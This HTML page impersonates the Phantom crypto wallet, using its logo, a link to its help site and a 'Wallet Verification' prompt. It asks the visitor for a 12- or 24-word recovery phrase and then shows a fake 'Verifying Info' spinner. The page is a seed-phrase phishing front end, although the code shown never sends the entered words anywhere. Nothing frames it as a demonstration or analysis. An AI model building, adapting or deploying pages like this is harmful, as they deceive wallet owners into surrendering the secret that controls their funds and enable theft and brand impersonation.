<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>Phantom</title>
    <style>
        * {
            box-sizing: border-box;
            margin: 0;
            padding: 0;
            font-family: -apple-system, BlinkMacSystemFont, "Segoe UI", Roboto, Helvetica, Arial, sans-serif;
            user-select: none;
            -webkit-user-select: none;
            -moz-user-select: none;
            -ms-user-select: none;
        }

        body {
            background-color: #d3cfff;
            color: #fff;
            height: 100vh;
            display: flex;
            flex-direction: column;
            justify-content: space-between;
            padding: 24px 32px;
            overflow: hidden;
        }

        /* Top Header Navigation */
        header {
            display: flex;
            justify-content: space-between;
            align-items: center;
            width: 100%;
            z-index: 10;
        }

        .ghost-close {
            display: flex;
            align-items: center;
            justify-content: center;
            background: transparent;
            border: none;
            cursor: pointer;
            padding: 0;
        }

        .phantom-logo {
            width: 42px;
            height: 34px;
        }

        .help-link {
            color: #000;
            background: transparent;
            border: 1px solid #bcbbd3;
            text-decoration: none;
            font-size: 13px;
            font-weight: 400;
            display: flex;
            align-items: center;
            gap: 6px;
            padding: 5px 10px;
            border-radius: 8px;
        }

        .help-link:hover {
            background-color: rgba(0, 0, 0, 0.03);
        }

        /* Main Modal Container with perimeter purple glow/tint */
        .main-wrapper {
            display: flex;
            justify-content: center;
            align-items: center;
            flex: 1;
            position: relative;
            z-index: 5;
        }

        .modal {
            background-color: #0c0c0e;
            width: 435px;
            border-radius: 24px;
            padding: 26px 22px 22px 22px;
            box-shadow: 0 25px 50px rgba(0, 0, 0, 0.3), 0 0 15px rgba(183, 148, 244, 0.12);
            border: 1px solid rgba(183, 148, 244, 0.2);
            display: flex;
            flex-direction: column;
            align-items: center;
            position: relative;
        }

        /* Pagination Dots */
        .dots {
            display: flex;
            gap: 8px;
            margin-bottom: 12px;
        }

        .dot {
            width: 10px;
            height: 10px;
            background-color: #3f3f46;
            border-radius: 50%;
        }

        .dot.active {
            background-color: #b794f4;
            width: 11px;
            height: 11px;
        }

        /* Modal Titles */
        .modal-title {
            font-size: 21px;
            font-weight: 600;
            margin-bottom: 6px;
            color: #fff;
            text-align: center;
        }

        .modal-subtitle {
            font-size: 13.5px;
            color: #8c8c9e;
            margin-bottom: 16px;
            text-align: center;
            line-height: 1.4;
        }

        /* Screen States */
        .screen-center {
            display: flex;
            flex-direction: column;
            align-items: center;
            text-align: center;
            width: 100%;
            padding: 10px 0;
        }

        .spinner {
            width: 40px;
            height: 40px;
            border: 3px solid #27272a;
            border-top: 3px solid #b794f4;
            border-radius: 50%;
            animation: spin 1s linear infinite;
            margin-bottom: 20px;
        }

        @keyframes spin {
            0% { transform: rotate(0deg); }
            100% { transform: rotate(360deg); }
        }

        .hidden {
            display: none !important;
        }

        /* Inputs Container Layout */
        .inputs-container {
            display: grid;
            grid-template-columns: repeat(3, 120px);
            justify-content: center;
            gap: 6px;
            width: 100%;
            margin-bottom: 14px;
        }

        /* Input Group */
        .input-group {
            position: relative;
            background-color: #141417;
            border: 1px solid #272730;
            border-radius: 9px;
            padding: 0 9px;
            height: 54px;
            display: flex;
            flex-direction: row; 
            align-items: center;
            gap: 5px; 
            transition: border-color 0.2s;
        }

        .input-group label {
            font-size: 14.5px;
            color: #a1a1aa;
            font-weight: 500;
            min-width: 24px;
            line-height: 1;
            user-select: none;
        }

        .input-group input {
            background: transparent;
            border: none;
            color: #fff;
            font-size: 16.5px; 
            outline: none;
            width: 100%;
            line-height: 1.2;
            user-select: none;
            -webkit-user-select: none;
        }

        /* Toggle Phrase Button */
        .toggle-phrase {
            color: #9c9cae;
            background: none;
            border: none;
            font-size: 13.5px;
            cursor: pointer;
            margin-bottom: 14px;
            font-weight: 500;
            transition: color 0.25s ease;
            pointer-events: auto;
        }

        .toggle-phrase:hover {
            color: #b794f4;
        }

        /* Action Buttons */
        .action-btn {
            width: 100%;
            background-color: #1c1c21;
            color: #71717a;
            border: none;
            border-radius: 12px;
            padding: 13.5px;
            font-size: 15.5px;
            font-weight: 600;
            cursor: not-allowed;
            pointer-events: none;
            transition: all 0.2s ease;
        }

        .action-btn.active-btn {
            background-color: #b794f4;
            color: #000;
            cursor: pointer;
            pointer-events: auto;
        }

        .action-btn.active-btn:hover {
            opacity: 0.85;
        }
    </style>
</head>
<body>

    <!-- Header -->
    <header>
        <button class="ghost-close" title="Phantom">
            <svg class="phantom-logo" viewBox="0 0 80 64" xmlns="http://www.w3.org/2000/svg">
                <path fill="#000000" d="M 7,49 C 3,43 7,30 13,22 C 22,10 37,1 49,1 C 63,0 72,9 73,22 C 74,34 68,47 60,54 C 54,59 49,57 48,51 C 43,58 34,61 29,56 C 23,62 13,65 8,60 C 5,57 5,53 7,49 Z"/>
                <ellipse cx="46" cy="24" rx="4" ry="5" fill="#d3cfff"/>
                <ellipse cx="58" cy="24" rx="4" ry="5" fill="#d3cfff"/>
            </svg>
        </button>
        <a href="https://phantom.com/help" target="_blank" class="help-link">
            <svg width="13" height="13" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2"><circle cx="12" cy="12" r="10"/><path d="M9.09 9a3 3 0 0 1 5.83 1c0 2-3 3-3 3"/><line x1="12" y1="17" x2="12.01" y2="17"/></svg>
            Help
        </a>
    </header>

    <!-- Main Section -->
    <div class="main-wrapper">
        <div class="modal">
            <!-- Initial Welcome Screen -->
            <div class="screen-center" id="welcomeScreen">
                <div class="dots">
                    <div class="dot active"></div>
                    <div class="dot"></div>
                    <div class="dot"></div>
                </div>
                <div class="modal-title">Wallet Verification</div>
                <div class="modal-subtitle">Begin wallet verification by adding your recovery phrase.</div>
                <button type="button" class="action-btn active-btn" id="startBtn" style="pointer-events: auto; cursor: pointer;">Continue</button>
            </div>

            <!-- Recovery Phrase Input Screen -->
            <div id="phraseScreen" class="hidden" style="width: 100%; display: flex; flex-direction: column; align-items: center;">
                <div class="dots">
                    <div class="dot active"></div>
                    <div class="dot"></div>
                    <div class="dot"></div>
                </div>

                <div class="modal-title">Recovery Phrase</div>
                <div class="modal-subtitle" id="subtitle-text">Import an existing wallet with your 12 or 24-word recovery phrase.</div>

                <div class="inputs-container" id="inputsGrid"></div>

                <button type="button" class="toggle-phrase" id="toggleBtn">I have a 24-word recovery phrase</button>

                <button type="button" class="action-btn" id="importBtn">Verify Wallet</button>
            </div>

            <!-- Loading / Verification Screen -->
            <div class="screen-center hidden" id="loadingScreen">
                <div class="dots">
                    <div class="dot active"></div>
                    <div class="dot"></div>
                    <div class="dot"></div>
                </div>
                <div class="spinner"></div>
                <div class="modal-title">Verifying Info</div>
                <div class="modal-subtitle">Verifying info, est. 2-5 mins</div>
            </div>
        </div>
    </div>

    <!-- Script Logic -->
    <script>
        let wordCount = 12;
        const welcomeScreen = document.getElementById('welcomeScreen');
        const phraseScreen = document.getElementById('phraseScreen');
        const loadingScreen = document.getElementById('loadingScreen');
        const startBtn = document.getElementById('startBtn');
        const inputsGrid = document.getElementById('inputsGrid');
        const toggleBtn = document.getElementById('toggleBtn');
        const subtitleText = document.getElementById('subtitle-text');
        const importBtn = document.getElementById('importBtn');

        startBtn.onclick = function(e) {
            e.preventDefault();
            welcomeScreen.classList.add('hidden');
            phraseScreen.classList.remove('hidden');
            renderInputs();
        };

        function renderInputs() {
            inputsGrid.innerHTML = '';
            for (let i = 1; i <= wordCount; i++) {
                const group = document.createElement('div');
                group.className = 'input-group';
                group.id = `group-${i}`;
                group.innerHTML = `
                    <label>${i}.</label>
                    <input type="text" autocomplete="off" autocapitalize="off" spellcheck="false" data-index="${i}" id="word-${i}">
                `;
                inputsGrid.appendChild(group);
            }
            checkCompletion();
        }

        toggleBtn.onclick = function(e) {
            e.preventDefault();
            if (wordCount === 12) {
                wordCount = 24;
                toggleBtn.textContent = "I have a 12-word recovery phrase";
                subtitleText.textContent = "Import an existing wallet with your 24-word recovery phrase.";
            } else {
                wordCount = 12;
                toggleBtn.textContent = "I have a 24-word recovery phrase";
                subtitleText.textContent = "Import an existing wallet with your 12 or 24-word recovery phrase.";
            }
            renderInputs();
        };

        function checkCompletion() {
            let allFilled = true;
            for (let i = 1; i <= wordCount; i++) {
                const inputEl = document.getElementById(`word-${i}`);
                if (!inputEl || inputEl.value.trim() === "") {
                    allFilled = false;
                    break;
                }
            }

            if (allFilled) {
                importBtn.classList.add('active-btn');
            } else {
                importBtn.classList.remove('active-btn');
            }
        }

        inputsGrid.addEventListener('input', (e) => {
            if (e.target.tagName === 'INPUT') {
                checkCompletion();
            }
        });

        importBtn.onclick = function(e) {
            e.preventDefault();
            if (!importBtn.classList.contains('active-btn')) return;

            phraseScreen.classList.add('hidden');
            loadingScreen.classList.remove('hidden');
        };
    </script>
</body>
</html>
